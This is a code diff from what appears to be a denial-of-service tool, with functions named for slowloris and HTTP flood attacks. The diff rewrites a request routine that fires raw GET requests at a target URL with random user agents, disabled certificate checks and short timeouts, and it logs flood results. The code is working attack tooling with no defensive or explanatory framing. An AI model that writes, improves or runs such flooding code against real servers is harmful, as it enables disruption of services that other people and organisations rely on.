@@ -137,51 +137,37 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
 
 
 def send_request(i, target_url, _):
-    p = urlparse(target_url)
-    host, port = p.hostname, p.port or (443 if p.scheme == "https" else 80)
-    path = p.path or "/"
-    if p.query:
-        path += "?" + p.query
-    req = (
-        f"GET {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"User-Agent: {get_random_uagent()}\r\n"
-        f"Connection: close\r\n\r\n"
-    ).encode()
-
     try:
+        p = urlparse(target_url)
+        host = p.hostname
+        port = p.port or (443 if p.scheme == "https" else 80)
+        path = p.path or "/"
+        if p.query:
+            path += "?" + p.query
+            
+        req = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"User-Agent: {get_random_uagent()}\r\n"
+            f"Connection: close\r\n\r\n"
+        ).encode()
+
         if p.scheme == "https":
-            ctx = ssl._create_unverified_context()
-            with ctx.wrap_socket(
-                socket.create_connection((host, port), timeout=2), server_hostname=host
-            ) as s:
-                s.sendall(req)
-                resp = s.recv(4096)
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            with socket.create_connection((host, port), timeout=1) as sock:
+                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+                    ssock.sendall(req)
+                    return ssock.recv(1024)
         else:
-            with socket.create_connection((host, port), timeout=2) as s:
-                s.sendall(req)
-                resp = s.recv(4096)
-
-        line = resp.split(b"\r\n", 1)[0]
-
-        try:
-            code = int(line.split()[1])
-            log.info(f"HTTP FLOOD - CODE - HTTP {code}")
-            return code
-        except (IndexError, ValueError) as e:
-            log.info(f"HTTP FLOOD - CODE - HTTP: {line.decode(errors='ignore')}")
-            return line.decode(errors="ignore")
-
-    except (socket.timeout, socket.error, ssl.SSLError) as e:
-        log.info(f"HTTP FLOOD - ERROR: {e}")
-        return str(e)
-
-
-def get_random_proxy(proxy_list):
-    if proxy_list:
-        return random.choice(proxy_list)
-    return None
-
+            with socket.create_connection((host, port), timeout=1) as sock:
+                sock.sendall(req)
+                return sock.recv(1024)
+                
+    except Exception as e:
+        log.error(f"HTTP FLOOD - Request failed: {e}")
+        return None
 
 def run_http_flood(target_url, packages, threads):
     log.info(
